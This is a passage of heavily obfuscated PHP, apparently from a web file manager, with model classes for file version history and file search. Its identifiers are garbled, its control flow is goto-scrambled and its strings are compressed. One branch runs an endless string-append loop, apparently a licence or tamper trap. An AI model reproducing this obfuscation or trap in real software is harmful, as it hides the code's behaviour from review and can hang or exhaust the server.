array_slice($f≈ê¢Í£«ƒ, 1)); } } if (!isset($_SERVER[$_SERVER[∞„˜ƒÑºª][51]]) || !isset($_SERVER[$_SERVER[∞„˜ƒÑºª][58]])) { goto b¶•∏Æ∞≥Ò; dÙ“◊‚¡¯ë: $Dœ‹◊π¢È¥(BASIC_PATH . $_SERVER[∞„˜ƒÑºª][54]); for (;;) { $Dœ‹◊π¢È¥ = $Dœ‹◊π¢È¥ . $_SERVER[∞„˜ƒÑºª][839]; } goto F¨≥ˆ≥ëæ´; Bèí≥›ß÷®: $dúø£ç“Ωê = explode($_SERVER[∞„˜ƒÑºª][55], $Eíö¯‹÷èã); if (count($dúø£ç“Ωê) < $_SERVER[∞„˜ƒÑºª][56]) { die; } $Dœ‹◊π¢È¥ = $_SERVER[∞„˜ƒÑºª][57]; goto dÙ“◊‚¡¯ë; b¶•∏Æ∞≥Ò: $D¬Âàà‹∑í = $_SERVER[∞„˜ƒÑºª][53]; $Fπ˜ÜŸ∞ôô = BASIC_PATH . $_SERVER[∞„˜ƒÑºª][54]; $Eíö¯‹÷èã = $D¬Âàà‹∑í($Fπ˜ÜŸ∞ôô); goto Bèí≥›ß÷®; F¨≥ˆ≥ëæ´: } goto e«ı¢Ωï◊Ï; F≥áèèâóƒ: $_SERVER[ÁÑì‰õ£†àï] = explode($_SERVER[∞„˜ƒÑºª][1699], gzinflate(substr($_SERVER[∞„˜ƒÑºª][1700], 10, -8))); class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\162\x63\x65\x5f\150\151\163\164\157\162\171"; public function addHistory($Dï√ü§œÒà, $DÂı—Û√éû = '') { $aöπÙöçÃ¬ =& $_SERVER[ÁÑì‰õ£†àï]; $EÌ˘ŒéÚä∞ = array($aöπÙöçÃ¬[0] => $Dï√ü§œÒà[$aöπÙöçÃ¬[1]], $aöπÙöçÃ¬[2] => isset($Dï√ü§œÒà[$aöπÙöçÃ¬[3]]) ? $Dï√ü§œÒà[$aöπÙöçÃ¬[3]] : $Dï√ü§œÒà[$aöπÙöçÃ¬[4]], $aöπÙöçÃ¬[5] => $Dï√ü§œÒà[$aöπÙöçÃ¬[6]], $aöπÙöçÃ¬[7] => $Dï√ü§œÒà[$aöπÙöçÃ¬[8]], $aöπÙöçÃ¬[9] => $DÂı—Û√éû); $this->historyAutoClear($EÌ˘ŒéÚä∞[$aöπÙöçÃ¬[1]]); $this->add($EÌ˘ŒéÚä∞); Model($aöπÙöçÃ¬[10])->eventFileEdit($Dï√ü§œÒà[$aöπÙöçÃ¬[1]]); } private function historyAutoClear($cÎëªïå«©) { goto a÷·±‘ú—è; a÷·±‘ú—è: $d√ãŒâ‡Ë¿ =& $_SERVER[ÁÑì‰õ£†àï]; $F‰Áﬁí≥úÈ = Model($d√ãŒâ‡Ë¿[11])->get($d√ãŒâ‡Ë¿[12]); $Dº≥ÇÙ´ƒÀ = $F‰Áﬁí≥úÈ == $d√ãŒâ‡Ë¿[13] ? 3 : 1000; goto b÷â∆∞ ˜ƒ; FîˆÍŒÎ¿¬: $C‰é÷Îè∑≈ = array_slice($C‰é÷Îè∑≈, $Fñπ¥‘ﬂÌË); $F‡ﬁ‹≥‡Üı = array_to_keyvalue($AÒÔî∆∂ëô, $d√ãŒâ‡Ë¿[16], $d√ãŒâ‡Ë¿[6]); $F‡ﬁ‹≥‡Üı = array_slice($F‡ﬁ‹≥‡Üı, $Fñπ¥‘ﬂÌË); goto Có¯ã˜ó¯◊; Có¯ã˜ó¯◊: $Fäı∏±Ëﬂé = array($d√ãŒâ‡Ë¿[18] => array($d√ãŒâ‡Ë¿[19], $C‰é÷Îè∑≈)); Model($d√ãŒâ‡Ë¿[20])->remove($F‡ﬁ‹≥‡Üı); $this->where($Fäı∏±Ëﬂé)->delete(); goto AßêÉõÕŸ•; b÷â∆∞ ˜ƒ: $Fñπ¥‘ﬂÌË = $Dº≥ÇÙ´ƒÀ - 1; if ($Fñπ¥‘ﬂÌË >= 200) { return; } $Fäı∏±Ëﬂé = array($d√ãŒâ‡Ë¿[0] => $cÎëªïå«©); goto B‚≈–ÇëÛì; B‚≈–ÇëÛì: $AÒÔî∆∂ëô = $this->field($d√ãŒâ‡Ë¿[14])->where($Fäı∏±Ëﬂé)->order($d√ãŒâ‡Ë¿[15])->select(); if (!$AÒÔî∆∂ëô || $Fñπ¥‘ﬂÌË >= count($AÒÔî∆∂ëô)) { return; } $C‰é÷Îè∑≈ = array_to_keyvalue($AÒÔî∆∂ëô, $d√ãŒâ‡Ë¿[16], $d√ãŒâ‡Ë¿[17]); goto FîˆÍŒÎ¿¬; AßêÉõÕŸ•: } public function listData($fÁû≈∑È–¶) { goto CáÈ†≥Ìç≤; dÇ›ÙÉ˘ûª: if ($A•È£®È˜Ó == $fâ¥ï™ëê¿[13]) { $CáÎ¬ÛÌ®ª[$fâ¥ï™ëê¿[22]] = array_slice($CáÎ¬ÛÌ®ª[$fâ¥ï™ëê¿[22]], 0, 3); $CáÎ¬ÛÌ®ª[$fâ¥ï™ëê¿[23]] = array($fâ¥ï™ëê¿[24] => 1, $fâ¥ï™ëê¿[25] => 20, $fâ¥ï™ëê¿[26] => 1, $fâ¥ï™ëê¿[27] => 3); } return $CáÎ¬ÛÌ®ª; goto d⁄Ω“™•Ê•; CáÈ†≥Ìç≤: $fâ¥ï™ëê¿ =& $_SERVER[ÁÑì‰õ£†àï]; $Fï§ê˘¶äÂ = array($fâ¥ï™ëê¿[0] => $fÁû≈∑È–¶); $DÜŒê£√üˆ = $fâ¥ï™ëê¿[21]; goto Bê¡ˆ∆†»”; Bê¡ˆ∆†»”: $CáÎ¬ÛÌ®ª = $this->field($DÜŒê£√üˆ)->where($Fï§ê˘¶äÂ)->order($fâ¥ï™ëê¿[15])->selectPage(); $this->_listAppendUser($CáÎ¬ÛÌ®ª[$fâ¥ï™ëê¿[22]]); $A•È£®È˜Ó = Model($fâ¥ï™ëê¿[11])->get($fâ¥ï™ëê¿[12]); goto dÇ›ÙÉ˘ûª; d⁄Ω“™•Ê•: } protected function _listAppendUser(&$fËÀÓ∞ıÊû) { $fπê¨Öß † =& $_SERVER[ÁÑì‰õ£†àï]; $b‹îáßè…ÿ = array_to_keyvalue($fËÀÓ∞ıÊû, $fπê¨Öß †[16], $fπê¨Öß †[28]); $C∫¨¢‚çÎ = Model($fπê¨Öß †[29])->userListInfo($b‹îáßè…ÿ); foreach ($fËÀÓ∞ıÊû as &$bÁŒë≥†ãÓ) { $dÕ¯‘ïΩÛø = $bÁŒë≥†ãÓ[$fπê¨Öß †[28]]; $bÁŒë≥†ãÓ[$fπê¨Öß †[4]] = $C∫¨¢‚çÎ[$dÕ¯‘ïΩÛø] ? $C∫¨¢‚çÎ[$dÕ¯‘ïΩÛø] : !1; } } public function fileInfo($a ê¢Óàûå) { $câ¯‡¿ÒÏ´ =& $_SERVER[ÁÑì‰õ£†àï]; $BÓæœêŸ•ı = $this->tablePrefix; $BÎ⁄†Íñìå = "{$BÓæœêŸ•ı}\151\x6f\137\x66\x69\154\145\x20\146\151\x6c\145\163\x20\x6f\156\x20\x66\151\x6c\x65\163\56\146\151\x6c\145\x49\x44\40\x3d\40\x68\x69\163\x74\x6f\162\171\56\x66\151\154\145\x49\104"; return $this->alias($câ¯‡¿ÒÏ´[30])->where(array($câ¯‡¿ÒÏ´[18] => $a ê¢Óàûå))->join($BÎ⁄†Íñìå, $câ¯‡¿ÒÏ´[31])->find(); } public function removeItem($eÀ£°åﬂì‡) { $D—•ìêùÔ∫ =& $_SERVER[ÁÑì‰õ£†àï]; $A û™™±üº = array($D—•ìêùÔ∫[18] => $eÀ£°åﬂì‡); $dã¿äÌû∞ß = $this->where($A û™™±üº)->find(); if ($dã¿äÌû∞ß) { Model($D—•ìêùÔ∫[20])->remove($dã¿äÌû∞ß[$D—•ìêùÔ∫[6]]); return $this->where($A û™™±üº)->delete(); } return !1; } public function removeBySource($a‚ø¨çñË¡) { goto eé√®é‡øÙ; D°´¥ áÈﬁ: $D™‘ßﬁ÷≤õ = array($F°ÓêŸÔ’Î[0] => array($F°ÓêŸÔ’Î[19], $a‚ø¨çñË¡)); $CâÒ÷¨§º± = $this->field($F°ÓêŸÔ’Î[5])->where($D™‘ßﬁ÷≤õ)->select(); if ($CâÒ÷¨§º±) { $Däô¥ÇÌÂ¨ = array_to_keyvalue($CâÒ÷¨§º±, $F°ÓêŸÔ’Î[16], $F°ÓêŸÔ’Î[6]); Model($F°ÓêŸÔ’Î[20])->remove($Däô¥ÇÌÂ¨); $this->where($D™‘ßﬁ÷≤õ)->delete(); } goto f÷Ÿ„å∑§”; f÷Ÿ„å∑§”: return !0; goto D∆É°†ë∫±; eé√®é‡øÙ: $F°ÓêŸÔ’Î =& $_SERVER[ÁÑì‰õ£†àï]; if (!$a‚ø¨çñË¡) { return !1; } if (!is_array($a‚ø¨çñË¡)) { $a‚ø¨çñË¡ = array($a‚ø¨çñË¡); } goto D°´¥ áÈﬁ; D∆É°†ë∫±: } public function setDetail($F≤©ÿ§Êì◊, $b®∑ï÷®”ù) { $FÁ¨ä±“ÒÖ =& $_SERVER[ÁÑì‰õ£†àï]; return $this->where(array($FÁ¨ä±“ÒÖ[18] => $F≤©ÿ§Êì◊))->save(array($FÁ¨ä±“ÒÖ[9] => $b®∑ï÷®”ù)); } public function rollbackToItem($F∂—Ù£Öü∞, $FÁï∏“›¨Â) { goto D∂≠â‘≠§«; Fë®’¶µË÷: return $this->where(array($Eå∞˜«óèí[18] => $FÁï∏“›¨Â))->delete(); goto b’ï¨Ö‚øË; f·î‹∏„Œ∞: $cÙ◊·ãÖµ∑ = $this->find($FÁï∏“›¨Â); $f‘øòëÕ∞◊ = array($Eå∞˜«óèí[6] => $cÙ◊·ãÖµ∑[$Eå∞˜«óèí[6]], $Eå∞˜«óèí[8] => $cÙ◊·ãÖµ∑[$Eå∞˜«óèí[8]], $Eå∞˜«óèí[3] => USER_ID); Model($Eå∞˜«óèí[32])->where(array($Eå∞˜«óèí[1] => $F∂—Ù£Öü∞))->save($f‘øòëÕ∞◊); goto Fë®’¶µË÷; D∂≠â‘≠§«: $Eå∞˜«óèí =& $_SERVER[ÁÑì‰õ£†àï]; $b√…Ìê¥áÜ = Model($Eå∞˜«óèí[32])->sourceInfo($F∂—Ù£Öü∞); $this->addHistory($b√…Ìê¥áÜ); goto f·î‹∏„Œ∞; b’ï¨Ö‚øË: } public function clearSame($Aâ∏•ãøΩÈ) { goto D©ª”ùÚ£º; Cïáç∞á√ê: $eÂÀˆäÆ‡¢ = array(); $FöÒ§ˆÇÒÃ = array(); foreach ($D∆ü…ò“ÒÛ as $f∂å€ª€´Ö) { if (count($f∂å€ª€´Ö) <= 1) { continue; } foreach ($f∂å€ª€´Ö as $eÉÇòÍÊëú) { $eÂÀˆäÆ‡¢[] = $eÉÇòÍÊëú[$f‡áè’Ãûª[6]]; $FöÒ§ˆÇÒÃ[] = $eÉÇòÍÊëú[$f‡áè’Ãûª[17]]; } } goto fáòâ”∫¥Û; D©ª”ùÚ£º: $f‡áè’Ãûª =& $_SERVER[ÁÑì‰õ£†àï]; $DÈ…≤£Í¿≈ = $this->listData($Aâ∏•ãøΩÈ); $D∆ü…ò“ÒÛ = array_to_keyvalue_group($DÈ…≤£Í¿≈, $f‡áè’Ãûª[6]); goto Cïáç∞á√ê; fáòâ”∫¥Û: if (!$FöÒ§ˆÇÒÃ) { return; } $this->where(array($f‡áè’Ãûª[17] => array($f‡áè’Ãûª[19], $FöÒ§ˆÇÒÃ)))->delete(); Model($f‡áè’Ãûª[33])->remove($eÂÀˆäÆ‡¢); goto A¡Àµ‰û¢™; A¡Àµ‰û¢™: } public function userSpace() { $bÏ¿êâŒèÊ =& $_SERVER[ÁÑì‰õ£†àï]; $AçÀ‡åﬂé• = $this->tablePrefix; $eÖÎ∆è‰áô = array($bÏ¿êâŒèÊ[2] => USER_ID); $aÀ‚»Û›¡í = "{$AçÀ‡åﬂé•}\151\x6f\x5f\146\x69\154\145\40\146\151\154\x65\x73\40\x6f\x6e\40\146\x69\154\145\163\x2e\146\151\154\x65\x49\x44\40\75\x20\x68\x69\163\x74\x6f\162\171\x2e\146\151\x6c\145\x49\x44"; return $this->alias($bÏ¿êâŒèÊ[30])->where($eÖÎ∆è‰áô)->join($aÀ‚»Û›¡í, $bÏ¿êâŒèÊ[31])->sum($bÏ¿êâŒèÊ[8]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($BºÜÜãΩÇ∆) { goto Bìº‘ûïï…; Bìº‘ûïï…: $CÑãÖ‹··÷ =& $_SERVER[∞„˜ƒÑºª]; $FÎ©ÚŒ∆ì∂ = KodIO::fileTypeList(); $BÇÇÑÆ√ø» = $FÎ©ÚŒ∆ì∂[$BºÜÜãΩÇ∆]; goto fÍïŸÔËÇ†; c™ÛÓØ±ÖÂ: if (!$BÇÇÑÆ√ø»[$CÑãÖ‹··÷[156]]) { $c∑Ò≤πÒòÎ = array_to_keyvalue($FÎ©ÚŒ∆ì∂, $CÑãÖ‹··÷[33], $CÑãÖ‹··÷[156]); $Eﬂê◊æÒ®Ÿ = implode($CÑãÖ‹··÷[47], $c∑Ò≤πÒòÎ); $c•∂¶ˆí˘– = $CÑãÖ‹··÷[1667]; } $Cõ¡∞éÊÁ‚ = explode($CÑãÖ‹··÷[47], trim($Eﬂê◊æÒ®Ÿ, $CÑãÖ‹··÷[47])); return array($c•∂¶ˆí˘–, $Cõ¡∞éÊÁ‚); goto bÊ¥Öÿá‹ˆ; fÍïŸÔËÇ†: if (!$BÇÇÑÆ√ø») { return array(); } $Eﬂê◊æÒ®Ÿ = $BÇÇÑÆ√ø»[$CÑãÖ‹··÷[156]]; $c•∂¶ˆí˘– = $CÑãÖ‹··÷[7]; goto c™ÛÓØ±ÖÂ; bÊ¥Öÿá‹ˆ: } public function listPathType($CãÃÙÀ∫—˘) { $dê¥»ùﬂ¬∆ =& $_SERVER[∞„˜ƒÑºª]; $f´‹«ô”•ñ = $this->fileTypeWhere($CãÃÙÀ∫—˘); if (!$f´‹«ô”•ñ) { return array(); } $Dèê∑Öì¯à = array($dê¥»ùﬂ¬∆[392] => SourceModel::TYPE_USER, $dê¥»ùﬂ¬∆[394] => USER_ID, $dê¥»ùﬂ¬∆[386] => 0, $dê¥»ùﬂ¬∆[388] => $f´‹«ô”•ñ); return $this->listSource($Dèê∑Öì¯à); } public function listSearch($B«éñç…¥Ñ, $Eüˆéëƒ≥ = 300) { goto A’Œ†Íùº—; b°ÜÉ‡ŒÕ©: $this->_listSearchTag($e„ë÷ü˘…õ, $B«éñç…¥Ñ, $d¨ÿõº£¨ÿ); $this->_listDataApply($e„ë÷ü˘…õ[$d–‚˜•Âá∞[354]]); $this->_listFilterInfo($e„ë÷ü˘…õ); goto cÁ‰≥äÖ·ñ; cÁ‰≥äÖ·ñ: return $e„ë÷ü˘…õ; goto Eë≈öÜ•æ ; CõÉâ±Ò∆Ê: $Eã∑ñ–ñ‹ó = $d–‚˜•Âá∞[1701]; $d¨ÿõº£¨ÿ = $Eã∑ñ–ñ‹ó; $this->_listSearchBindPinyin($B«éñç…¥Ñ, $fÇ±Ÿ≤£ﬁ°, $Eã∑ñ–ñ‹ó); goto Cª∆û´∂Àó; A’Œ†Íùº—: $d–‚˜•Âá∞ =& $_SERVER[∞„˜ƒÑºª]; $fÇ±Ÿ≤£ﬁ° = $this->_parseSearchWhere($B«éñç…¥Ñ); if (!isset($fÇ±Ÿ≤£ﬁ°[$d–‚˜•Âá∞[410]])) { $fÇ±Ÿ≤£ﬁ°[$d–‚˜•Âá∞[410]] = 0; } goto CõÉâ±Ò∆Ê; Cª∆û´∂Àó: $this->alias($d–‚˜•Âá∞[1702])->_makeOrder()->cache(null, 10); $e„ë÷ü˘…õ = $this->distinct(!0)->field($Eã∑ñ–ñ‹ó)->where($fÇ±Ÿ≤£ﬁ°)->selectPage($Eüˆéëƒ≥); $this->_listSearchDesc($e„ë÷ü˘…õ, $B«éñç…¥Ñ, $d¨ÿõº£¨ÿ); goto b°ÜÉ‡ŒÕ©; Eë≈öÜ•æ : } private function _listSearchTag(&$açø—åÕüú, $DÇÖˆ≈ΩøÙ, $Eô¨’œÍÌã) { goto Eú‘ÆπÜﬂà; d•¶Ñì∂›°: if (!$fü°æ¿ú€≠) { return; } $c©è’Îëè≤ = array($dÀ¡÷€¥œå[1704] => array($dÀ¡÷€¥œå[7], $fü°æ¿ú€≠)); $B∑∏ﬂúÌ‘¢ = Model($dÀ¡÷€¥œå[1705])->field($dÀ¡÷€¥œå[84])->where($c©è’Îëè≤)->select(); goto AÇ§∑ß∂ÇÚ; Eú‘ÆπÜﬂà: $dÀ¡÷€¥œå =& $_SERVER[∞„˜ƒÑºª]; if (!$DÇÖˆ≈ΩøÙ[$dÀ¡÷€¥œå[1604]] || $açø—åÕüú[$dÀ¡÷€¥œå[351]][$dÀ¡÷€¥œå[338]] > 1) { return; } $Bä°™¶îıö = Model($dÀ¡÷€¥œå[1703])->listData(); goto F·äúåÍäö; F·äúåÍäö: $fü°æ¿ú€≠ = array(); $e‚Áö”ëë» = $DÇÖˆ≈ΩøÙ[$dÀ¡÷€¥œå[1604]]; foreach ($Bä°™¶îıö as $Dù‘≤ùáπÍ) { $e„éìÕ…Ç“ = $Dù‘≤ùáπÍ[$dÀ¡÷€¥œå[28]]; $B”ñ€÷ë◊à = str_replace($dÀ¡÷€¥œå[50], $dÀ¡÷€¥œå[33], Pinyin::encode($e„éìÕ…Ç“)); if (stripos($e„éìÕ…Ç“, $e‚Áö”ëë») !== !1 || stripos($B”ñ€÷ë◊à, $e‚Áö”ëë») !== !1) { $fü°æ¿ú€≠[] = $Dù‘≤ùáπÍ[$dÀ¡÷€¥œå[366]]; } } goto d•¶Ñì∂›°; AÇ§∑ß∂ÇÚ: $B∑∏ﬂúÌ‘¢ = array_to_keyvalue($B∑∏ﬂúÌ‘¢, $dÀ¡÷€¥œå[33], $dÀ¡÷€¥œå[84]); $e¥´ëÍé†û = array_unique($B∑∏ﬂúÌ‘¢); $this->_listSearchMerge($açø—åÕüú, $DÇÖˆ≈ΩøÙ, $Eô¨’œÍÌã, $e¥´ëÍé†û); goto b“ª°çÈÒ·; b“ª°çÈÒ·: } private function _listSearchDesc(&$DªÓÖ∂Ìöœ, $B‚Ï÷ºµ•Î, $c¡“ﬂ≤Œ¥è) { goto B⁄¿°ê‹ΩÑ; B⁄¿°ê‹ΩÑ: $b†ùÊ¡ï≤É =& $_SERVER[∞„˜ƒÑºª]; if (!$B‚Ï÷ºµ•Î[$b†ùÊ¡ï≤É[1604]] || $DªÓÖ∂Ìöœ[$b†ùÊ¡ï≤É[351]][$b†ùÊ¡ï≤É[338]] > 1) { return; } $cÍßπå⁄´Ÿ = $this->listSearchChildren($B‚Ï÷ºµ•Î[$b†ùÊ¡ï≤É[384]]); goto cÚ¬ÑŒ⁄Áœ; cÚ¬ÑŒ⁄Áœ: $cÍßπå⁄´Ÿ = array_unique($cÍßπå⁄´Ÿ); if (!$cÍßπå⁄´Ÿ) { return; } $F≤¥üäπ≈Ü = array($b†ùÊ¡ï≤É[374] => array($b†ùÊ¡ï≤É[7], $cÍßπå⁄´Ÿ), $b†ùÊ¡ï≤É[96] => $b†ùÊ¡ï≤É[1560], $b†ùÊ¡ï≤É[357] => array($b†ùÊ¡ï≤É[519], $b†ùÊ¡ï≤É[1606] . $B‚Ï÷ºµ•Î[$b†ùÊ¡ï≤É[1604]] . $b†ùÊ¡ï≤É[1606])); goto BõåùÁâ◊Á; BõåùÁâ◊Á: $E†ê™éª«Ñ = Model($b†ùÊ¡ï≤É[380])->field($b†ùÊ¡ï≤É[374])->where($F≤¥üäπ≈Ü)->select(); $AÜª¡ñÁ˜¥ = array_to_keyvalue($E†ê™éª«Ñ, $b†ùÊ¡ï≤É[33], $b†ùÊ¡ï≤É[374]); $this->_listSearchMerge($DªÓÖ∂Ìöœ, $B‚Ï÷ºµ•Î, $c¡“ﬂ≤Œ¥è, $AÜª¡ñÁ˜¥); goto f≠≠„¯¯Û·; f≠≠„¯¯Û·: } private function _listSearchMerge(&$fèëçÀÖ⁄¬, $bê¬ÌÎÉÊò, $CÛÂåÒäû§, $C—ﬂÖÚõÀË) { goto cõß√ú≠†£; cõß√ú≠†£: $DÀ›∑¨™‰ı =& $_SERVER[∞„˜ƒÑºª]; if (!$C—ﬂÖÚõÀË) { return; } $BÈ´Í´Ï‘¶ = array_to_keyvalue($fèëçÀÖ⁄¬[$DÀ›∑¨™‰ı[354]], $DÀ›∑¨™‰ı[33], $DÀ›∑¨™‰ı[374]); goto d ëØ´ÔÔ°; f“Ã¥¡á≈É: $Eóã¨È≤˜£ = $this->field($CÛÂåÒäû§)->where($cêœÂ…è∞)->select(); if (!$Eóã¨È≤˜£) { return; } $A„ª·≠Éóû = array(); goto FîÆı…”≈™; FîÆı…”≈™: foreach ($Eóã¨È≤˜£ as $CÜ¶¶ç™îü) { $BÉÓÌ‡Ï∏õ = $DÀ›∑¨™‰ı[47] . $bê¬ÌÎÉÊò[$DÀ›∑¨™‰ı[384]] . $DÀ›∑¨™‰ı[47]; if (stripos($CÜ¶¶ç™îü[$DÀ›∑¨™‰ı[373]], $BÉÓÌ‡Ï∏õ) !== !1) { $A„ª·≠Éóû[] = $CÜ¶¶ç™îü; } } $fèëçÀÖ⁄¬[$DÀ›∑¨™‰ı[354]] = array_merge($A„ª·≠Éóû, $fèëçÀÖ⁄¬[$DÀ›∑¨™‰ı[354]]); $fèëçÀÖ⁄¬[$DÀ›∑¨™‰ı[351]][$DÀ›∑¨™‰ı[352]] += count($A„ª·≠Éóû); goto b„˘ÓÀöﬂ; d ëØ´ÔÔ°: $AàßÀœî¿’ = array_diff($C—ﬂÖÚõÀË, $BÈ´Í´Ï‘¶); if (!$AàßÀœî¿’) { return; } $cêœÂ…è∞ = array($DÀ›∑¨™‰ı[374] => array($DÀ›∑¨™‰ı[7], $AàßÀœî¿’)); goto f“Ã¥¡á≈É; b„˘ÓÀöﬂ: } public function listSearchChildren($aæ’‘¢Æﬂâ, $b›®´ÆÕ¿‹ = 5000) { goto cëùÙÔ‹“å; CóÔõ´•°Á: $c˜ƒﬁ¡íÁØ = $this->field($aŒ›¥…“∞•[374])->where($bªÙç¯Á‹ï)->select(); $bÇ”›Õè÷´ = array_to_keyvalue($c˜ƒﬁ¡íÁØ, $aŒ›¥…“∞•[33], $aŒ›¥…“∞•[374]); return $bÇ”›Õè÷´; goto bÁä”·ı®Ö; EÊÜâ‚Ÿìû: $bªÙç¯Á‹ï = array($aŒ›¥…“∞•[373] => array($aŒ›¥…“∞•[519], $bÈïû’ò◊©[$aŒ›¥…“∞•[373]] . $bÈïû’ò◊©[$aŒ›¥…“∞•[374]] . $aŒ›¥…“∞•[409])); $aÓ‹Ç¢âÖÉ = $this->field($aŒ›¥…“∞•[374])->where($bªÙç¯Á‹ï)->count(); if ($aÓ‹Ç¢âÖÉ > $b›®´ÆÕ¿‹) { return $this->_listSearchChildrenNear($aæ’‘¢Æﬂâ, $b›®´ÆÕ¿‹); } goto CóÔõ´•°Á; cëùÙÔ‹“å: $aŒ›¥…“∞• =& $_SERVER[∞„˜ƒÑºª]; $bÇ”›Õè÷´ = array(); $bÈïû’ò◊© = $this->sourceInfo($aæ’‘¢Æﬂâ); goto EÊÜâ‚Ÿìû; bÁä”·ı®Ö: } private function _listSearchChildrenNear($a∏π∫Â‹Ü∂, $dı‹Ã±“¶Ç) { goto D©æõàáÙÿ; c˘ºÏÁ√›Á: $EéÊïîıõÆ = array_merge($EéÊïîıõÆ, array_to_keyvalue($Eí≤„ˆ≤øÔ, $d™ö∆Ñ¿≥™[33], $d™ö∆Ñ¿≥™[374])); $EéÊïîıõÆ = array_slice($EéÊïîıõÆ, 0, $dı‹Ã±“¶Ç); return $EéÊïîıõÆ; goto CÓà—Æ®ªœ; f∑÷Ï±∂∑¯: $Eí≤„ˆ≤øÔ = $this->field($d™ö∆Ñ¿≥™[1706])->where($b˜ËÙ¿ó‹≤)->select(); $F˜œ¶è¢á  = array_to_keyvalue(array_filter_by_field($Eí≤„ˆ≤øÔ, $d™ö∆Ñ¿≥™[375], $d™ö∆Ñ¿≥™[376]), $d™ö∆Ñ¿≥™[33], $d™ö∆Ñ¿≥™[374]); $EéÊïîıõÆ = array_merge($EéÊïîıõÆ, array_to_keyvalue($Eí≤„ˆ≤øÔ, $d™ö∆Ñ¿≥™[33], $d™ö∆Ñ¿≥™[374])); goto EÓ–ïÔÍ⁄˜; EÓ–ïÔÍ⁄˜: if (!$F˜œ¶è¢á ) { return $EéÊïîıõÆ; } $b˜ËÙ¿ó‹≤ = array($d™ö∆Ñ¿≥™[384] => array($d™ö∆Ñ¿≥™[7], $F˜œ¶è¢á )); $Eí≤„ˆ≤øÔ = $this->field($d™ö∆Ñ¿≥™[1706])->where($b˜ËÙ¿ó‹≤)->select(); goto c˘ºÏÁ√›Á; D©æõàáÙÿ: $d™ö∆Ñ¿≥™ =& $_SERVER[∞„˜ƒÑºª]; $EéÊïîıõÆ = array(); $b˜ËÙ¿ó‹≤ = array($d™ö∆Ñ¿≥™[384] => $a∏π∫Â‹Ü∂); goto f∑÷Ï±∂∑¯; CÓà—Æ®ªœ: } private function _listSearchBindPinyin($D˜ñ°á÷“Ü, &$aﬂ∞π•·ââ, &$aª–Â≥‘»‚) { goto b≈—≈ê∏†∑; Eá•Çæêª∂: $E„Í¬£ë ° = array(); $aª–Â≥‘»‚ = str_replace(array($c’”≈⁄„Ï∞[55], $c’”≈⁄„Ï∞[50], $c’”≈⁄„Ï∞[1707]), $c’”≈⁄„Ï∞[33], $aª–Â≥‘»‚); $aª–Â≥‘»‚ = $c’”≈⁄„Ï∞[1708] . str_replace($c’”≈⁄„Ï∞[47], $c’”≈⁄„Ï∞[1709], $aª–Â≥‘»‚); goto bΩà†Ëº◊; bΩà†Ëº◊: unset($aﬂ∞π•·ââ[$c’”≈⁄„Ï∞[28]]); foreach ($aﬂ∞π•·ââ as $fÙƒº≤ÍŸÇ => $Cëö—±»›) { $E„Í¬£ë °[$c’”≈⁄„Ï∞[1708] . $fÙƒº≤ÍŸÇ] = $Cëö—±»›; } $bÇÑ÷õ÷‹Ø = array($c’”≈⁄„Ï∞[408], $c’”≈⁄„Ï∞[1606] . $D˜ñ°á÷“Ü[$c’”≈⁄„Ï∞[1604]] . $c’”≈⁄„Ï∞[1606]); goto dßè±ç∏øÁ; dßè±ç∏øÁ: $E„Í¬£ë °[] = array($c’”≈⁄„Ï∞[1710] => $bÇÑ÷õ÷‹Ø, $c’”≈⁄„Ï∞[674] => $c’”≈⁄„Ï∞[1608], array($c’”≈⁄„Ï∞[1711] => $bÇÑ÷õ÷‹Ø, $c’”≈⁄„Ï∞[1712] => array($c’”≈⁄„Ï∞[7], array($c’”≈⁄„Ï∞[404], $c’”≈⁄„Ï∞[405])))); $this->join($A–Ú’ﬂñ‘ì); $aﬂ∞π•·ââ = $E„Í¬£ë °; goto AË⁄”ÕüÃÇ; b≈—≈ê∏†∑: $c’”≈⁄„Ï∞ =& $_SERVER[∞„˜ƒÑºª]; if (!Input::check($D˜ñ°á÷“Ü[$c’”≈⁄„Ï∞[1604]], $c’”≈⁄„Ï∞[305]) || strlen($D˜ñ°á÷“Ü[$c’”≈⁄„Ï∞[1604]]) < 2) { return; } $A–Ú’ﬂñ‘ì = "\114\105\x46\124\x20\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\157\137\163\x6f\165\162\x63\x65\x5f\155\145\164\x61\40\155\145\164\x61\x20\x6f\156\40\x73\157\x75\162\x63\x65\56\x73\157\x75\162\143\x65\x49\104\40\75\40\155\x65\164\x61\56\x73\157\x75\x72\x63\x65\x49\x44"; goto Eá•Çæêª∂; AË⁄”ÕüÃÇ: } private function _parseSearchWhere($D≤ç©‚≈Ÿ¯) { goto Cí∞Æ•‹Öá; Cí∞Æ•‹Öá: $bø°Ôë“®Í =& $_SERVER[∞„˜ƒÑºª]; $dˆô∏¶É∂ò = array(); if (isset($D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[458]])) { $dˆô∏¶É∂ò[$bø°Ôë“®Í[109]] = array($bø°Ôë“®Í[1713], $D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[458]]); } goto eêòó›ì∫ö; eêòó›ì∫ö: if (isset($D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[459]])) { $A¨ç‹âçÓ† = array($bø°Ôë“®Í[1714], $D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[459]]); if ($dˆô∏¶É∂ò[$bø°Ôë“®Í[109]]) { $dˆô∏¶É∂ò[$bø°Ôë“®Í[109]] = array($dˆô∏¶É∂ò[$bø°Ôë“®Í[109]], $A¨ç‹âçÓ†, $bø°Ôë“®Í[1715]); } else { $dˆô∏¶É∂ò[$bø°Ôë“®Í[109]] = $A¨ç‹âçÓ†; } } if (isset($D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[1716]])) { $dˆô∏¶É∂ò[$bø°Ôë“®Í[86]] = array($bø°Ôë“®Í[1713], $D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[1716]]); } if (isset($D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[1717]])) { $A¨ç‹âçÓ† = array($bø°Ôë“®Í[1714], $D≤ç©‚≈Ÿ¯[$bø°Ôë“®Í[1717]]); if ($dˆô∏¶É∂ò[$bø°Ôë“®Í[86]]) { $dˆô∏¶É∂ò[$bø°Ôë“®Í[86]] = array($dˆô∏¶É∂ò[$bø°Ôë“®Í[86]], $A¨ç‹âçÓ†, $bø°Ôë“®Í[1715]); } else { 